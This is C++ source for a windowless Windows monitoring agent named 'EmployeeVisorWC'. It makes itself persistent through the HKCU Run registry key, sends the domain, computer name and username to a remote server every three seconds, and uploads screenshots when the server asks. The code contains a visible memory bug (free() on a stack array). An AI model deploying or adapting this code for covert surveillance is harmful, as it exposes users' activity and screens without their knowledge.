// ev.cpp : Определяет точку входа для приложения.
//

#include "framework.h"
#include "ev.h"

#include "utils.hpp"

#include <string>
#include <algorithm>
#include <iostream>

#pragma comment(lib, "rpcrt4.lib")  // UuidCreate - Minimum supported OS Win 2000
#include <rpc.h>

#include <Winhttp.h>
#pragma comment(lib, "Winhttp")

#include <Shlwapi.h> // SHRegGetValue
#pragma comment(lib, "Shlwapi")

#define HTTP_TIMEOUT 15000

// Память вроде чищу, но не факт, что везде это как надо работает. Не прогнал тесты

// Просто создадим WinApi проект, у которого нет графического окна

constexpr auto HOST_ENV_VAR_NAME = L"SERVER_VAR";
constexpr auto buff_size = static_cast<DWORD>(100);
constexpr auto DELTA_SEC = static_cast<DWORD>(3);
// Пока на правах костыля
const WCHAR* SAVE_BITMAP_TO = L"PATH_TO_FILE";

void AutoRun()
{
    WCHAR arr[MAX_PATH] = {};

    // https://learn.microsoft.com/ru-ru/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea
    const auto res = GetModuleFileName(NULL, (LPWSTR)arr, MAX_PATH);

    // У winapi тут бага знатная. res никоим образом(почему-то вопреки докам) не характеризует состояние выполнения вызова
    if ((GetLastError() == ERROR_SUCCESS)) {
        HKEY hKey;

        if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
        {
            if (RegSetValueEx(hKey, L"ev", NULL, REG_SZ, (LPBYTE)arr, sizeof(arr)) == ERROR_SUCCESS)
            {
                RegCloseKey(hKey);
            }
            else {
                wprintf(L"Error autorun!\n");
                exit(5);
            }
            return;
        }
    }
    else {
        wprintf(L"Not found module! Error code: %d / %d\n", res, GetLastError());
        exit(8);
    }

    free(arr);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    AutoRun();

    auto buff = new WCHAR[buff_size];

    const auto var_size = GetEnvironmentVariable(HOST_ENV_VAR_NAME, buff, buff_size);

    if (var_size == 0) {
        wprintf(L"var size was 0 for %s\n", HOST_ENV_VAR_NAME);
        return 1;
    }
    else if (var_size > buff_size) {
        // OK, so 50 isn't big enough.
        if (buff) {
            delete[] buff;
        }
        buff = new WCHAR[var_size];

        const auto new_size = GetEnvironmentVariable(HOST_ENV_VAR_NAME, buff, var_size);

        if (new_size == 0 || new_size > var_size) {
            // wtf case
            return 2;
        }
    }

    BOOL shouldTakeScreenshot = false;

    while (buff != NULL) {
        auto l = static_cast<DWORD>(0);

        auto gd = getDomain();
        auto d = std::wstring((gd == NULL ? L"" : gd));
        delete[] gd;
        auto gc = getComputerName(l);
        auto c = std::wstring((gc == NULL ? L"" : gc));
        delete[] gc;
        auto gu = getUsername(l);
        auto u = std::wstring((gu == NULL ? L"" : gu));
        delete[] gu;
        

        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

        hSession = WinHttpOpen(L"EmployeeVisorWC",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (hSession) {
            hConnect = WinHttpConnect(hSession, buff, 8000, 0);
        }
        else {
            wprintf(L"Could not get session!\n");
        }

        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"POST",
                L"/ua",
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0);
        } else {
            wprintf(L"Could not connect to %s!\n", buff);
        }

        BOOL bResults = FALSE;

        std::string bitmapAsStr;

        if (shouldTakeScreenshot) {
            SaveBitmap(SAVE_BITMAP_TO);

            bitmapAsStr = ReadBitmap(SAVE_BITMAP_TO);

            shouldTakeScreenshot = false;
        }

        auto data = d + L"\n" + c + L"\n" + u + L"\n";

        char* body = new char[data.size() + bitmapAsStr.size() + 1];

        std::copy(data.begin(), data.end(), body);
        std::copy(bitmapAsStr.begin(), bitmapAsStr.end(), body + data.size());
        body[data.size() + bitmapAsStr.size()] = '\0';

        wprintf(L"Sending %s %s %s\n", d.c_str(), c.c_str(), u.c_str());

        if (hRequest) {
            WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/octet-stream", -1L, WINHTTP_ADDREQ_FLAG_ADD);
            wprintf(L"Got hRequest\n");
            bResults = WinHttpSendRequest(hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS,
                0, (LPVOID*)(body), data.size() + bitmapAsStr.size() + 1,
                data.size() + bitmapAsStr.size() + 1, 0);
        }
        else {
            wprintf(L"Could not get hRequest\n");
        }

        // End the request.
        if (bResults)
            bResults = WinHttpReceiveResponse(hRequest, NULL);

        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        LPSTR pszOutBuffer;

        // Keep checking for data until there is nothing left.
        if (bResults)
        {
            do
            {
                // Check for available data.
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                    printf("Error %u in WinHttpQueryDataAvailable.\n",
                        GetLastError());

                // Allocate space for the buffer.
                pszOutBuffer = new char[static_cast<unsigned long long>(dwSize) + 1];
                if (!pszOutBuffer)
                {
                    printf("Out of memory\n");
                    dwSize = 0;
                }
                else
                {
                    // Read the data.
                    ZeroMemory(pszOutBuffer, static_cast<unsigned long long>(dwSize) + 1);

                    if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                        dwSize, &dwDownloaded))
                        printf("Error %u in WinHttpReadData.\n", GetLastError());
                    else
                        printf("%s", pszOutBuffer);

                    const auto response = std::string(pszOutBuffer);

                    if (response == "1") {
                        shouldTakeScreenshot = true;
                    }

                    // Free the memory allocated to the buffer.
                    delete[] pszOutBuffer;
                }
            } while (dwSize > 0);
        }

        if (!bResults) {
            printf("Error %d has occurred.\n", GetLastError());
        }

        delete[] body;

        // Close open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        Sleep(1000 * DELTA_SEC);
    }

    return 0;
}